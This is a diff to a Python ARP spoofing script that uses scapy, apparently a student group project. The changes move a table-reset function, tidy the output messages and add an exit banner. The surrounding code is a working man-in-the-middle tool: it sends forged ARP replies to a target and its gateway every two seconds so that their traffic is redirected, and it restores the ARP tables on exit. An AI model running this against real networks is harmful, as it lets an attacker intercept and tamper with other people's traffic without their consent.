@@ -9,6 +9,14 @@ import scapy.all as scapy
 import time
 import pyfiglet
 
+# Reset ARP tables back to original values
+def reset(destination_ip, source_ip):
+    print("\n[*] Reseting ARP tables...")
+    destination_mac = get_mac(destination_ip)
+    source_mac = get_mac(source_ip)
+    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
+    scapy.send(packet, verbose = False)
+
 # To get MAC address of target and router
 def get_mac(ip):
 	arp_req = scapy.ARP(pdst = ip)
@@ -21,14 +29,6 @@ def get_mac(ip):
 def spoof(target_ip, spoof_ip):
 	packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = get_mac(target_ip), psrc = spoof_ip)
 	scapy.send(packet, verbose = False)
-
-# Reset ARP tables back to original values
-def reset(destination_ip, source_ip):
-    print("\n[*] Restoring Targets' ARP tables...")
-    destination_mac = get_mac(destination_ip)
-    source_mac = get_mac(source_ip)
-    packet = scapy.ARP(op = 2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
-    scapy.send(packet, verbose = False)
 	
 # Display instructions
 def msg():
@@ -46,13 +46,16 @@ def attack():
             spoof(target_ip, gateway_ip)
             spoof(gateway_ip, target_ip)
             packets_count += 2
-            print("\r[*]" + str(packets_count) + "packets sent ", end ="")
+            print("\r[*]" + str(packets_count) + " packets sent ", end ="")
             time.sleep(2)                       # 2s wait before updating ARP table again
     except KeyboardInterrupt:                   # exit program with keyboard interrupt
         print("\n[!] Exiting ARP Spoofer...")
         reset(gateway_ip, target_ip)
         reset(target_ip, gateway_ip)
-        print("[+] Arp Spoof Stopped")
+        print("\n[+] ARP tables have been reset.")
+        print("\n[+] Arp Spoof Stopped")
+        bye = pyfiglet.figlet_format("P2 Group 13", font = "digital" )
+        print(bye)
 
 if __name__ == '__main__':
     if len(sys.argv) != 3:
